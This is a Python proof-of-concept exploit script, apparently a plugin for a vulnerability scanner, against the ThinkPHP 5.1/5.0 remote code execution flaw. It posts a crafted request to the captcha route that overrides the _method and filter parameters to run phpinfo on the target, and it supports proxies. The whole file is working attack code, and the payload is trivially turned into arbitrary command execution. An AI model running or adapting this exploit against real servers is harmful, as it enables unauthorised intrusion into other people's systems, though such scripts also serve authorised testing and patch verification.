import requests
import random

#Thinkphp 5.1.( 31)&5.0.( 23)远程代码执行
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    header = {'User-Agent': user_agent}

    #漏洞位置
    exploit_url = url+'/index.php?s=captcha'
    datas = {"_method": "__construct","filter[]":"phpinfo","method":"get","server[REQUEST_METHOD]":1}
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.post(exploit_url, headers=header,data=datas, proxies=proxies)

    else:
        response = requests.post(exploit_url,data=datas, headers=header)
    # with open('b.html','wb') as f:
    #     f.write(response.content)
    # print(response.text)
    if response.status_code==200 :
        if 'PHP Version' in response.text:
            return 'Thinkphp 5.1.(31)&5.0.(23) - 远程代码执行'


def run(url,logindict,user_agent,proxies):
    result = poc(url,logindict,user_agent,proxies)
    return result

#run("http://192.168.1.144:8080/",{'admin':'admin'},'','')